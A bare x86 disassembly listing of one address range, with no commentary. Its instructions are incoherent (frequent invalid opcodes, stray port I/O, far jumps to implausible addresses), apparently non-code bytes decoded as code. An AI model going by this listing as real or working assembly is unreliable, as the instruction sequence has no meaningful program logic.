  40bfb4:	mov    ss,WORD PTR [eax-0x3137b31f]
  40bfba:	dec    edx
  40bfbb:	xchg   edx,eax
  40bfbc:	fs loope 0x40bf89
  40bfbf:	popf   
  40bfc0:	push   ds
  40bfc1:	adc    BYTE PTR [esp+edx*1-0x7b],0x3b
  40bfc6:	ins    DWORD PTR es:[edi],dx
  40bfc7:	(bad)  
  40bfc9:	jmp    0x40bfeb
  40bfcb:	mov    ecx,DWORD PTR [eax-0x637dff2]
  40bfd1:	repz jnp 0x40bf77
  40bfd4:	ret    0x343
  40bfd7:	cmp    DWORD PTR [ebp-0x64cfffc3],eax
  40bfdd:	adc    DWORD PTR [esi+0x536a190c],esi
  40bfe3:	out    dx,al
  40bfe4:	dec    ecx
  40bfe5:	and    al,BYTE PTR [edi-0x462ccf6a]
  40bfeb:	and    DWORD PTR [esp+ecx*4],edi
  40bfee:	repz pop ebx
  40bff0:	xor    eax,0x9f9f92b5
  40bff5:	and    DWORD PTR [ecx],esi
  40bff7:	cmc    
  40bff8:	neg    DWORD PTR [edi+0x67]
  40bffb:	aas    
  40bffc:	inc    ecx
  40bffd:	add    ch,BYTE PTR [eax+0x1e]
  40c000:	push   ss
  40c001:	(bad)  
  40c002:	xor    eax,0x507b1865
  40c007:	sbb    DWORD PTR [edi+edx*4],esp
  40c00a:	mov    ds:0x26078382,eax
  40c00f:	shr    BYTE PTR [ebx-0x7d8ec2a6],cl
  40c015:	sub    DWORD PTR [esi+esi*2+0x39],0x42
  40c01a:	les    esp,FWORD PTR [ebx]
  40c01c:	mov    ah,0x78
  40c01e:	fwait
  40c01f:	pop    esi
  40c020:	dec    ecx
  40c021:	pop    ds
  40c022:	int3   
  40c023:	retf   
  40c024:	fldenv [ebx-0x46]
  40c027:	push   ecx
  40c028:	lea    edi,gs:[eax+0x30]
  40c02c:	push   es
  40c02d:	aad    0xb5
  40c02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c030:	fisubr WORD PTR ds:0xf8be6f74
  40c036:	push   es
  40c037:	lock adc DWORD PTR cs:[edx-0x16ee03a1],ebx
  40c03f:	cmp    al,0x6a
  40c041:	xor    eax,0x6b71589c
  40c046:	add    DWORD PTR [edx+0x70bb6c35],esi
  40c04c:	ins    DWORD PTR es:[edi],dx
  40c04d:	mov    dh,0x3
  40c04f:	mov    edx,0xb819ae68
  40c054:	iret   
  40c055:	lods   al,BYTE PTR ds:[esi]
  40c056:	ins    BYTE PTR es:[edi],dx
  40c057:	test   edx,edx
  40c059:	dec    ebx
  40c05a:	jge    0x40c067
  40c05c:	push   ebp
  40c05d:	cmp    BYTE PTR [edx],dh
  40c05f:	jae    0x40c053
  40c061:	shl    DWORD PTR ds:0xfbaa0f5f,cl
  40c067:	stos   DWORD PTR es:[edi],eax
  40c068:	add    al,0x4e
  40c06a:	push   0xe630cd16
  40c06f:	jp     0x40c068
  40c071:	(bad)  
  40c072:	mov    ebx,0xab77d346
  40c077:	aaa    
  40c078:	inc    esi
  40c079:	xor    DWORD PTR [esi+ebx*8+0x7f],ecx
  40c07d:	and    dl,BYTE PTR [edx]
  40c07f:	push   es
  40c080:	loopne 0x40c028
  40c082:	sbb    eax,0xe0061f16
  40c087:	in     eax,0x4
  40c089:	push   cs
  40c08a:	mov    dl,BYTE PTR [edi+0x770da437]
  40c090:	pusha  
  40c091:	ss test BYTE PTR cs:[eax-0x4fba3bb8],0x3c
  40c09a:	cld    
  40c09b:	call   0xbc03c121
  40c0a0:	cmp    ch,al
  40c0a2:	nop
  40c0a3:	add    bl,BYTE PTR [ecx]
  40c0a5:	loop   0x40c05a
  40c0a7:	lea    ebp,[eax+0x52]
  40c0aa:	push   ds
  40c0ab:	sub    esp,DWORD PTR [edi]
  40c0ad:	scas   al,BYTE PTR es:[edi]
  40c0ae:	nop
  40c0af:	sahf   
  40c0b0:	fnstcw WORD PTR [esi+0x1b]
  40c0b3:	sbb    ecx,DWORD PTR [esi-0x21370cf3]
  40c0b9:	cwde   
  40c0ba:	call   0x8d89:0x8071fea6
  40c0c1:	fs cs (bad) 
  40c0c5:	in     al,dx
  40c0c6:	(bad)  [ebp+0xc985ffb]
  40c0cc:	xor    eax,DWORD PTR [ebx]
  40c0ce:	or     DWORD PTR [edi+ebp*8-0x31cc51bd],ebp
  40c0d5:	popf   
  40c0d6:	dec    ecx
  40c0d7:	(bad)  
  40c0d8:	and    al,0x9a
  40c0da:	add    DWORD PTR [ecx],ebp
  40c0dc:	lods   eax,DWORD PTR ds:[esi]
  40c0dd:	imul   esp,DWORD PTR [eax+0x78b2c9],0xfffffffb
  40c0e4:	mov    ecx,0x91ddad48
  40c0e9:	mov    eax,0xabc77607
  40c0ee:	fmul   DWORD PTR [ebp-0x59344e43]
  40c0f4:	or     eax,0x10ff1854
  40c0f9:	js     0x40c12f
  40c0fb:	fst    st(1)
  40c0fd:	jmp    0x40c0b3
  40c0ff:	pop    ecx
  40c100:	dec    ebp
  40c101:	in     al,dx
  40c102:	inc    esi
  40c103:	scas   eax,DWORD PTR es:[edi]
  40c104:	xchg   edx,eax
  40c105:	(bad)  
  40c106:	mov    ds:0xa2eead91,eax
  40c10b:	or     al,0x1
  40c10d:	rcl    BYTE PTR [ebp+0x5e],cl
  40c110:	mov    ecx,edx
  40c112:	dec    edx
  40c113:	or     eax,0xb739ff72
  40c118:	hlt    
  40c119:	add    esi,DWORD PTR [eax+eiz*1+0x28ebe4d0]
  40c120:	inc    eax
  40c121:	mov    ah,0xed
  40c123:	leave  
  40c124:	jno    0x40c108
  40c126:	mov    dl,0xdf
  40c128:	scas   eax,DWORD PTR es:[edi]
  40c129:	stos   DWORD PTR es:[edi],eax
  40c12a:	add    DWORD PTR [ecx+edx*2-0x24],ecx
  40c12e:	sub    DWORD PTR [eax+esi*1],ecx
  40c131:	(bad)  
  40c132:	loopne 0x40c187
  40c134:	ins    DWORD PTR es:[edi],dx
  40c135:	retf   0x812
  40c138:	mov    esp,0x86f3a6bf
  40c13d:	fist   WORD PTR [edx]
  40c13f:	mov    ecx,0xcd10ae8a
  40c144:	pushf  
  40c145:	retf   0x500e
  40c148:	jmp    0x40c137
  40c14a:	and    al,0xd2
  40c14c:	popf   
  40c14d:	inc    edi
  40c14e:	rcr    DWORD PTR [edi+0x49d25347],cl
  40c154:	dec    edi
  40c155:	fs and bh,ah
  40c158:	xchg   esp,eax
  40c159:	clc    
  40c15a:	pop    eax
  40c15b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c15c:	ins    BYTE PTR es:[edi],dx
  40c15d:	ret    
  40c15e:	in     eax,0x69
  40c160:	cmp    dl,BYTE PTR [eax-0x76]
  40c163:	cmp    eax,DWORD PTR [edi+0x1a]
  40c166:	lds    edi,FWORD PTR [esi-0x4ceaa122]
  40c16c:	cdq    
  40c16d:	xchg   edi,eax
  40c16e:	stos   DWORD PTR es:[edi],eax
  40c16f:	loopne 0x40c102
  40c171:	push   ebp
  40c172:	daa    
  40c173:	inc    ecx
  40c174:	mov    esi,0x717d9b18
  40c179:	std    
  40c17a:	enter  0xb207,0x41
  40c17e:	fist   DWORD PTR [ebx]
  40c180:	push   ebx
  40c181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c182:	scas   al,BYTE PTR es:[edi]
  40c183:	cmc    
  40c184:	loop   0x40c187
  40c186:	xor    eax,edi
  40c188:	iret   
  40c189:	call   0x612dbfaf
  40c18e:	(bad)  
  40c18f:	popf   
  40c190:	xrelease mov DWORD PTR [eax],eax
  40c193:	test   DWORD PTR [ecx],0x21fbe088
  40c199:	jmp    0xbb24:0xda795762
  40c1a0:	lock (bad) 
  40c1a2:	clc    
  40c1a3:	or     eax,0x3ed55f00
  40c1a8:	aas    
  40c1a9:	scas   eax,DWORD PTR es:[edi]
  40c1aa:	mov    bh,0x1c
  40c1ac:	mov    dh,0x25
  40c1ae:	or     DWORD PTR [eax],esp
  40c1b0:	cli    
  40c1b1:	stos   DWORD PTR es:[edi],eax
  40c1b2:	aam    0x6e
  40c1b4:	(bad)  
  40c1b5:	pop    ebp
  40c1b6:	jno    0x40c19d
  40c1b8:	enter  0xc635,0x21
  40c1bc:	sar    DWORD PTR [edi+ebx*4+0xc],0x8
  40c1c1:	adc    ah,BYTE PTR [eax+0x4a]
  40c1c4:	popf   
  40c1c5:	xchg   esi,eax
  40c1c6:	in     eax,dx
  40c1c7:	and    esi,0x94280bd6
  40c1cd:	adc    al,0x59
  40c1cf:	jmp    0x40c1c5
  40c1d1:	mov    WORD PTR [edx+0x7e11bccc],?
  40c1d7:	adc    ah,BYTE PTR [esi]
  40c1d9:	and    DWORD PTR [ebx],ebp
  40c1db:	cmp    al,0xe0
  40c1dd:	mov    ebp,DWORD PTR [ebx]
  40c1df:	inc    edx
  40c1e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1e1:	dec    edi
  40c1e2:	or     BYTE PTR [ecx],al
  40c1e4:	or     al,0x2a
  40c1e6:	lock cmp BYTE PTR [edi],ah
  40c1e9:	cmp    BYTE PTR [ecx],cl
  40c1eb:	in     al,0x3b
  40c1ed:	cmp    bh,BYTE PTR [eax]
  40c1ef:	stos   DWORD PTR es:[edi],eax
  40c1f0:	imul   eax,esp,0x48
  40c1f3:	push   0xffffff86
  40c1f5:	cmp    eax,0xdbf92ed0
  40c1fa:	out    0x6b,al
  40c1fc:	js     0x40c257
  40c1fe:	ds jns 0x40c1ec
  40c201:	icebp  
  40c202:	dec    ecx
  40c203:	dec    eax
  40c204:	or     al,0x1f
  40c206:	jno    0x40c194
  40c208:	in     eax,dx
  40c209:	ds cwde 
  40c20b:	mov    WORD PTR [edx+eax*1],?
  40c20e:	dec    ebx
  40c20f:	xchg   esp,eax
  40c210:	push   ebp
  40c212:	outs   dx,BYTE PTR ds:[esi]
  40c213:	push   ss
  40c214:	or     edx,edi
  40c216:	fs aas 
  40c218:	and    BYTE PTR [edi],cl
  40c21a:	jb     0x40c26a
  40c21c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c21d:	(bad)  
  40c21e:	fidivr WORD PTR [esi+0x79]
  40c221:	sbb    bh,ah
  40c223:	retf   
  40c224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c225:	and    eax,0xa9a3d363
  40c22a:	test   bl,0xcd
  40c22d:	inc    esi
  40c22e:	je     0x40c22e
  40c230:	jns    0x40c280
  40c232:	sbb    edx,DWORD PTR [ebx]
  40c234:	int    0x68
  40c236:	and    DWORD PTR [ebp-0x48],esi
  40c239:	jl     0x40c1e3
  40c23b:	pop    esi
  40c23c:	lods   al,BYTE PTR ds:[esi]
  40c23d:	mov    al,ds:0x624fccda
  40c243:	push   edx
  40c244:	mov    edi,0xc32f68ff
  40c249:	gs call 0x6258:0x5bf44b8b
  40c251:	push   ebp
  40c252:	fisttp WORD PTR [edi-0x11]
  40c255:	jns    0x40c254
  40c257:	cmp    BYTE PTR [edx+0x7c297c60],0x4e
  40c25e:	enter  0x4eb,0xda
  40c262:	retf   0xfaae
  40c265:	(bad)  
  40c266:	sub    edx,esp
  40c268:	gs nop
  40c26a:	pop    ebp
  40c26b:	pusha  
  40c26c:	imul   eax,ecx,0x7b1af413
  40c272:	bound  esi,QWORD PTR ds:0xac0dddfb
  40c278:	jmp    0x40c230
  40c27a:	pop    edi
  40c27b:	sub    esi,0x1556df6e
  40c281:	xor    al,0x36
  40c283:	dec    BYTE PTR [ebp+0x2d]
  40c286:	sbb    ch,0xe1
  40c289:	mov    ds:0xdd5856bb,al
  40c28e:	cs fs sbb dl,ch
  40c292:	(bad)  
  40c293:	fsub   st,st(6)
  40c295:	adc    DWORD PTR [eax-0x60661dbf],edi
  40c29b:	push   ss
  40c29c:	sub    BYTE PTR [esi],0xe6
  40c29f:	sub    cl,BYTE PTR [ecx]
  40c2a1:	retf   0x8a56
  40c2a4:	test   DWORD PTR [edi],0x5c21bd8f
  40c2aa:	pop    eax
  40c2ab:	push   ss
  40c2ac:	lea    ebp,[ecx-0x3]
  40c2af:	aaa    
  40c2b0:	xor    edi,DWORD PTR [eax-0x54709409]
  40c2b6:	add    al,0xc1
  40c2b8:	jl     0x40c330
  40c2ba:	jae    0x40c2fb
  40c2bc:	push   edi
  40c2bd:	cmp    DWORD PTR [ebp+0x6b],ecx
  40c2c0:	sub    BYTE PTR [ecx-0x45130803],dl
  40c2c6:	out    0xc2,al
  40c2c8:	mov    ebx,0xcfe5d78b
  40c2cd:	(bad)  
  40c2ce:	sub    eax,0x82aff693
  40c2d3:	cmp    DWORD PTR [edx+0x6a],edx
  40c2d6:	inc    esp
  40c2d7:	test   DWORD PTR [edx+0x64],0x25748113
  40c2de:	inc    esi
  40c2df:	sub    dl,bh
  40c2e1:	(bad)  
  40c2e2:	sbb    BYTE PTR [edi+0x5b],dh
  40c2e5:	test   eax,0x16c9d39c
  40c2ea:	sbb    ch,bl
  40c2ec:	push   ecx
  40c2ed:	ja     0x40c321
  40c2ef:	int3   
  40c2f0:	sub    BYTE PTR [edi+0x6a],cl
  40c2f3:	out    dx,eax
  40c2f4:	adc    al,0xc4
  40c2f6:	shr    BYTE PTR [esi-0x3b],0x5f
  40c2fa:	(bad)  
  40c2fb:	cli    
  40c2fc:	mov    eax,ds:0x870dd1ca
  40c301:	bound  edx,QWORD PTR [ebp-0x365329ee]
  40c307:	mov    ch,0x6f
  40c309:	sbb    eax,0xefddd9d1
  40c30e:	mov    ch,BYTE PTR [eax]
  40c310:	push   edi
  40c311:	sti    
  40c312:	dec    esi
  40c313:	ins    DWORD PTR es:[edi],dx
  40c314:	and    BYTE PTR [esi-0x30],dh
  40c317:	or     BYTE PTR [eax+0x5619b48c],0x8e
  40c31e:	inc    ebx
  40c31f:	mov    bh,0xd4
  40c321:	sub    eax,0xf4aa7338
  40c326:	or     eax,0x6c975c1c
  40c32b:	mov    bh,0x84
  40c32d:	out    dx,eax
  40c32e:	mov    bl,0x71
  40c330:	inc    ebx
  40c331:	or     al,0xd8
  40c333:	les    esi,FWORD PTR [ebx+0x358fde8c]
  40c339:	cwde   
  40c33a:	mov    al,ds:0x13ad8d34
  40c33f:	in     al,0xc3
  40c341:	(bad)  
  40c342:	imul   esp,edi,0x37ec81b7
  40c348:	int    0xb8
  40c34a:	loopne 0x40c358
  40c34c:	or     eax,0xa128c9b1
  40c351:	adc    BYTE PTR [esi],ah
  40c353:	adc    ch,BYTE PTR [ebx-0x53e74d1]
  40c359:	loopne 0x40c322
  40c35b:	pop    ecx
  40c35c:	adc    bl,BYTE PTR [ebp+eax*8+0x44]
  40c360:	cmp    eax,0x70045158
  40c365:	je     0x40c338
  40c367:	dec    eax
  40c368:	xchg   esi,ebp
  40c36a:	test   DWORD PTR [eax+ebx*4],0x20ad9436
  40c371:	push   ecx
  40c372:	ja     0x40c38d
  40c374:	and    edx,DWORD PTR [edx+0x5e]
  40c377:	pop    ss
  40c378:	lock xchg edi,eax
  40c37a:	(bad)  
  40c37b:	mov    dh,0xde
  40c37d:	and    BYTE PTR [edi+0x58dcfd14],bh
  40c383:	daa    
  40c384:	leave  
  40c385:	dec    ecx
  40c386:	loope  0x40c309
  40c388:	test   DWORD PTR [ecx+0x31],edi
  40c38b:	mov    edx,0xc53e3f6b
  40c390:	nop
  40c391:	mov    cl,0x0
  40c393:	fcom   DWORD PTR [ebp+0x69c26010]
  40c399:	ss push esi
  40c39b:	enter  0xfd0c,0xeb
  40c39f:	addr16 jbe 0x40c38b
  40c3a2:	shl    BYTE PTR [edi],cl
  40c3a4:	push   ds
  40c3a5:	not    BYTE PTR [eax-0x49]
  40c3a8:	jne    0x40c3e4
  40c3aa:	(bad)  
  40c3ab:	push   esi
  40c3ac:	push   es
  40c3ad:	add    edi,DWORD PTR [edi+0x3d]
  40c3b0:	mov    ds:0xbf31acf3,eax
  40c3b5:	pop    ebx
  40c3b6:	aad    0xd0
  40c3b8:	pop    esp
  40c3b9:	loop   0x40c3bd
  40c3bb:	in     al,0x2b
  40c3bd:	fs and ebp,esi
  40c3c0:	lahf   
  40c3c1:	push   ds
  40c3c2:	cli    
  40c3c3:	xor    al,0x8c
  40c3c5:	mov    edi,0xb035f1d
  40c3ca:	jle    0x40c396
  40c3cc:	xor    al,0xcb
  40c3ce:	cmp    ecx,DWORD PTR [edx+0x130d8a5a]
  40c3d4:	das    
  40c3d5:	repnz shl BYTE PTR [esi+0x37],1
  40c3d9:	sbb    al,0x68
  40c3db:	and    eax,0x2475f174
  40c3e0:	mov    dh,0x5d
  40c3e2:	out    0x39,eax
  40c3e4:	lea    ecx,[edi-0x32]
  40c3e7:	mov    bl,0x53
  40c3e9:	enter  0xdb2b,0xb7
  40c3ed:	add    BYTE PTR [esi+ebx*2+0x18],ch
  40c3f1:	jmp    0x7a80:0x439e2aee
  40c3f8:	sbb    eax,DWORD PTR [ebx-0x48416d8a]
  40c3fe:	push   eax
  40c3ff:	gs mov edi,0xbaac5d64
  40c405:	pop    edi
  40c406:	add    ch,al
  40c408:	xor    ebp,DWORD PTR [edi]
  40c40a:	rcr    ch,0xed
  40c40d:	stos   DWORD PTR es:[edi],eax
  40c40e:	retf   
  40c40f:	mov    al,ds:0xc8cbfd32
  40c414:	adc    al,0xbf
  40c416:	sbb    al,0xec
  40c418:	in     eax,dx
  40c419:	mov    ebx,0xbf5a741f
  40c41e:	(bad)  
  40c41f:	push   ebp
  40c420:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40c422:	lods   al,BYTE PTR ds:[esi]
  40c423:	jmp    0x8052b37f
  40c428:	mov    BYTE PTR [edx],dh
  40c42a:	cmp    al,0x1e
  40c42c:	shl    BYTE PTR [esi+ebx*8-0x669fbb28],0x6a
  40c434:	imul   edi,DWORD PTR [eax-0x3dbdb774],0x2706e600
  40c43e:	jecxz  0x40c494
  40c440:	cmp    esp,DWORD PTR [edi+0x7d2c60f]
  40c446:	je     0xca363c20
  40c44c:	call   0x53aa:0xdeb50acc
  40c453:	push   edi
  40c454:	lea    ecx,[edi+0x55]
  40c457:	fwait
  40c458:	arpl   WORD PTR [eax+ecx*4],di
  40c45b:	sbb    bh,0xd7
  40c45e:	sbb    eax,0x21f7b64d
  40c463:	pop    eax
  40c464:	jno    0x40c437
  40c466:	inc    edi
  40c467:	cwde   
  40c468:	call   0x79d70bb4
  40c46d:	dec    ebx
  40c46e:	inc    esi
  40c46f:	mov    esi,0x3835cac1
  40c474:	sub    bh,BYTE PTR [ebx+0x14]
  40c477:	add    cl,ah
  40c479:	jb     0x40c40a
  40c47b:	jo     0x40c4b1
  40c47d:	out    dx,al
  40c47e:	push   cs
  40c47f:	aas    
  40c480:	mov    ebx,0xce2a5d2f
  40c485:	jae    0x40c409
  40c487:	mov    al,ds:0xe374e676
  40c48c:	stos   BYTE PTR es:[edi],al
  40c48d:	imul   BYTE PTR [ebx]
  40c48f:	(bad)  
  40c490:	mov    al,0x9a
  40c492:	xor    ebx,ebx
  40c494:	neg    DWORD PTR [ebx+edx*8-0x31]
  40c498:	cld    
  40c499:	addr16 sti 
  40c49b:	sbb    ah,BYTE PTR [esi+0x7fafedb4]
  40c4a1:	out    0x61,al
  40c4a3:	arpl   ax,dx
  40c4a5:	ret    0xc3d6
  40c4a8:	ss jne 0x40c4a0
  40c4ab:	adc    al,0x8c
  40c4ad:	ret    
  40c4ae:	call   DWORD PTR [ecx+0x41]
  40c4b1:	sbb    ebx,edi
  40c4b3:	dec    ecx
  40c4b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4b5:	sbb    DWORD PTR [edx],edi
  40c4b7:	fimul  DWORD PTR [esi-0x50]
  40c4ba:	fild   WORD PTR [edi+0x52]
  40c4bd:	lds    esp,FWORD PTR [esi+0x1b1bc809]
  40c4c3:	jns    0x40c44c
  40c4c5:	and    dh,ah
  40c4c7:	and    DWORD PTR [ebp-0x67b75438],0xffffffcd
  40c4ce:	sbb    ecx,eax
  40c4d0:	aad    0xd0
  40c4d2:	ror    edx,1
  40c4d4:	repz sbb DWORD PTR [edx-0x163ce255],edi
  40c4db:	in     eax,dx
  40c4dc:	jo     0x40c4c7
  40c4de:	mov    dh,0x84
  40c4e0:	(bad)  
  40c4e1:	and    al,BYTE PTR [ebx-0x14]
  40c4e4:	pop    ebp
  40c4e5:	aaa    
  40c4e6:	dec    edi
  40c4e7:	lock mov bh,BYTE PTR [edx+0x4f]
  40c4eb:	aas    
  40c4ec:	das    
  40c4ed:	fs push ebp
  40c4ef:	les    ebx,FWORD PTR [edi]
  40c4f1:	punpcklwd mm6,DWORD PTR [edi-0x6d]
  40c4f5:	out    0xd5,eax
  40c4f7:	or     edx,eax
  40c4f9:	jge    0x40c54b
  40c4fb:	cld    
  40c4fc:	dec    eax
  40c4fd:	in     al,dx
  40c4fe:	(bad)  
  40c4ff:	fcmovne st,st(4)
  40c501:	ret    0xc96e
  40c504:	xor    al,0x4e
  40c506:	jns    0x40c51b
  40c508:	aam    0xb0
  40c50a:	enter  0x2126,0x7b
  40c50e:	xor    ebp,DWORD PTR ds:0xa3be5c9c
  40c515:	jb     0x40c589
  40c517:	sbb    esi,DWORD PTR [ecx]
  40c519:	add    esp,DWORD PTR [esi+0x4a]
  40c51c:	cmp    esp,ebx
  40c51e:	or     DWORD PTR [ebp-0x28],0x3d
  40c522:	dec    esp
  40c523:	stos   BYTE PTR es:[edi],al
  40c524:	cdq    
  40c525:	pop    ebp
  40c526:	mov    ah,0x4a
  40c528:	popf   
  40c529:	fdiv   DWORD PTR [eax+esi*2+0x27a1a9a2]
  40c530:	xchg   BYTE PTR [edi],dl
  40c532:	pushf  
  40c533:	cs stos BYTE PTR es:[edi],al
  40c535:	ds adc eax,0x332044ad
  40c53b:	out    0x8e,al
  40c53d:	daa    
  40c53e:	dec    ebx
  40c53f:	dec    esi
  40c540:	jo     0x40c596
  40c542:	pusha  
  40c543:	mov    esp,0x64dbbd92
  40c548:	and    DWORD PTR [eax],ecx
  40c54a:	lods   eax,DWORD PTR ds:[esi]
  40c54b:	and    esp,DWORD PTR ds:[ecx-0x63]
  40c54f:	cdq    
  40c550:	fs in  eax,0xfb
  40c553:	xchg   edi,eax
  40c554:	xor    esp,DWORD PTR [edi+0x507b916f]
  40c55a:	adc    eax,0x33cedf15
  40c55f:	sbb    BYTE PTR [ebx],dh
  40c561:	pushf  
  40c562:	push   0xffffff81
  40c564:	push   0xd954f6c2
  40c569:	inc    eax
  40c56a:	popa   
  40c56b:	jne    0x40c525
  40c56d:	pop    ecx
  40c56e:	and    esi,0x1f
  40c571:	cmp    eax,0xbef14773
  40c576:	mov    DWORD PTR [edx-0x1d],eax
  40c579:	inc    esp
  40c57a:	ficom  WORD PTR [esi]
  40c57c:	cmp    al,0xb5
  40c57e:	out    dx,al
  40c57f:	adc    edi,edi
  40c581:	or     DWORD PTR [esi-0x67],ebx
  40c584:	data16 fist DWORD PTR ds:0xe85b76ae
  40c58b:	mov    eax,0x224e7408
  40c590:	(bad)  
  40c591:	fld    QWORD PTR [edx+0x11]
  40c594:	or     DWORD PTR [ebx+0x5504947d],ebx
  40c59a:	cmp    BYTE PTR [ecx+0x7e86c3b9],0x2e
  40c5a1:	dec    edx
  40c5a2:	gs push ds
  40c5a4:	inc    eax
  40c5a5:	cwde   
  40c5a6:	(bad)  
  40c5a8:	ins    BYTE PTR es:[edi],dx
  40c5a9:	fldlg2 
  40c5ab:	jge    0x40c5e2
  40c5ad:	dec    BYTE PTR ds:0x4a6be700
  40c5b3:	mov    BYTE PTR [edx],bh
  40c5b5:	mov    al,ds:0x77f2fc91
  40c5ba:	jo     0x40c632
  40c5bc:	test   DWORD PTR [ebx+0x2],esp
  40c5bf:	out    0xe8,al
  40c5c1:	pop    ds
  40c5c2:	fwait
  40c5c3:	int    0x6
  40c5c5:	test   BYTE PTR [ebp+0x30],cl
  40c5c8:	je     0x40c586
  40c5ca:	sub    eax,esi
  40c5cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5cd:	fwait
  40c5ce:	aaa    
  40c5cf:	out    0xc8,eax
  40c5d1:	ja     0x40c64a
  40c5d3:	in     eax,0xf6
  40c5d5:	push   ss
  40c5d6:	and    cl,BYTE PTR [esi+0x3c]
  40c5d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5da:	add    eax,0xaf191892
  40c5df:	sbb    eax,0xfeb8f1fa
  40c5e4:	jo     0x40c660
  40c5e6:	jecxz  0x40c613
  40c5e8:	test   DWORD PTR [ebx+0x64],0xeb845bec
  40c5ef:	push   ebx
  40c5f0:	inc    ebx
  40c5f1:	stc    
  40c5f2:	ja     0x40c5e9
  40c5f4:	aam    0x63
  40c5f6:	sbb    al,0xc8
  40c5f8:	xchg   BYTE PTR [edi],ch
  40c5fa:	jns    0x40c663
  40c5fc:	lahf   
  40c5fd:	or     edi,DWORD PTR [ebx+ebx*1+0x72dbd9cf]
  40c604:	add    ebp,DWORD PTR [ecx+0x13]
  40c607:	and    cl,0x8f
  40c60a:	mov    ds:0xc36577f2,al
  40c60f:	ins    DWORD PTR es:[edi],dx
  40c610:	sub    eax,0x38265bd0
  40c615:	pop    ebx
  40c616:	sahf   
  40c617:	retf   0x2afa
  40c61a:	pusha  
  40c61b:	mov    eax,ds:0x54878ae6
  40c620:	pop    ecx
  40c621:	add    BYTE PTR [esp+edx*2],cl
  40c624:	mov    edi,0xfadf6a6f
  40c629:	int    0x42
  40c62b:	push   ebp
  40c62c:	imul   ebp,DWORD PTR [edx-0x245133b7],0x6786ebc0
  40c636:	xor    ebx,edi
  40c638:	mov    cl,0x3c
  40c63a:	and    DWORD PTR [esi-0x6],esp
  40c63d:	ret    
  40c63e:	ror    BYTE PTR [eax+edi*4-0x5c],1
  40c642:	(bad)  
  40c643:	clc    
  40c644:	pop    edx
  40c645:	enter  0xb46a,0x49
  40c649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c64a:	lods   eax,DWORD PTR ds:[esi]
  40c64b:	lds    edx,FWORD PTR [ecx-0x56d8ee7b]
  40c651:	dec    edi
  40c652:	popa   
  40c653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c654:	mov    dh,0xca
  40c656:	dec    edi
  40c657:	push   esp
  40c658:	mov    edi,0x96daa0e4
  40c65d:	jl     0x40c630
  40c65f:	ret    0xd98b
  40c662:	jae    0x40c68a
  40c664:	and    BYTE PTR [esi],dh
  40c666:	aad    0xa2
  40c668:	pushf  
  40c669:	cmp    ecx,DWORD PTR [ebx-0x30ff6cb2]
  40c66f:	imul   esp,DWORD PTR [eax-0x55871b5e],0x854d880f
  40c679:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c67b:	mov    ds:0xe3d94d3d,al
  40c680:	test   DWORD PTR [ebx],0x3b2d861d
  40c686:	adc    edx,DWORD PTR [edx]
  40c688:	xchg   ecx,eax
  40c689:	or     bl,BYTE PTR [edx+0x4c]
  40c68c:	mov    ds:0x9f5f40ed,eax
  40c691:	clc    
  40c692:	(bad)  ds:0x3d6281e4
  40c698:	pop    edx
  40c699:	or     eax,0xb0e03ac1
  40c69e:	jmp    0x40c677
  40c6a0:	fdiv   DWORD PTR ds:0xeeadc71f
  40c6a6:	pop    es
  40c6a7:	pushf  
  40c6a8:	cli    
  40c6a9:	xchg   ecx,eax
  40c6aa:	cmp    al,cl
  40c6ac:	xor    bl,BYTE PTR [ecx+0x7c2a469a]
  40c6b2:	jl     0x40c6df
  40c6b4:	aam    0x36
  40c6b6:	mov    eax,0xe78db891
  40c6bb:	adc    eax,0xef109cee
  40c6c0:	ja     0x40c6b9
  40c6c2:	aas    
  40c6c3:	sub    ecx,DWORD PTR [esi-0x686ae235]
  40c6c9:	mov    esp,0x76504df0
  40c6ce:	xchg   ebp,eax
  40c6cf:	fwait
  40c6d0:	pop    ds
  40c6d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6d2:	pop    eax
  40c6d3:	jnp    0x40c70e
  40c6d5:	push   esp
  40c6d6:	mov    dh,0x45
  40c6d8:	adc    ah,BYTE PTR [ebx]
  40c6da:	mov    DWORD PTR [ebp-0x13dd4c6b],esp
  40c6e0:	ret    
  40c6e1:	dec    esi
  40c6e2:	stc    
  40c6e3:	ret    
  40c6e4:	scas   eax,DWORD PTR es:[di]
  40c6e6:	in     al,0x6a
  40c6e8:	cmp    eax,0x40592178
  40c6ed:	push   es
  40c6ee:	ficom  DWORD PTR [ebx+0x4c]
  40c6f1:	hlt    
  40c6f2:	mov    ah,0x43
  40c6f4:	out    dx,al
  40c6f5:	push   esi
  40c6f6:	dec    esi
  40c6f7:	stos   BYTE PTR es:[edi],al
  40c6f8:	fs popf 
  40c6fa:	(bad)  
  40c6fb:	pminsw mm3,QWORD PTR [edi-0x1d7f28ba]
  40c702:	xchg   al,dl
  40c704:	fnstenv [ecx+ebp*8]
  40c707:	jnp    0x40c68d
  40c709:	in     eax,dx
  40c70a:	stos   DWORD PTR es:[edi],eax
  40c70b:	pop    edx
  40c70c:	mov    cr5,edx
  40c70f:	clc    
  40c710:	nop
  40c711:	mov    ebx,DWORD PTR [ebx+0x81d257]
  40c717:	jg     0x40c770
  40c719:	rcl    BYTE PTR [edx-0x63226fdf],1
  40c71f:	xlat   BYTE PTR ds:[ebx]
  40c720:	(bad)  [edx-0x210adc2a]
  40c726:	mov    dl,0xd
  40c728:	jecxz  0x40c72a
  40c72a:	xor    bl,ah
  40c72c:	inc    esp
  40c72d:	lahf   
  40c72e:	xchg   edx,eax
  40c72f:	mov    dl,0x28
  40c731:	repz cmp dh,ah
  40c734:	jl     0x40c795
  40c736:	jp     0x40c783
  40c738:	and    BYTE PTR [ecx-0xb],dh
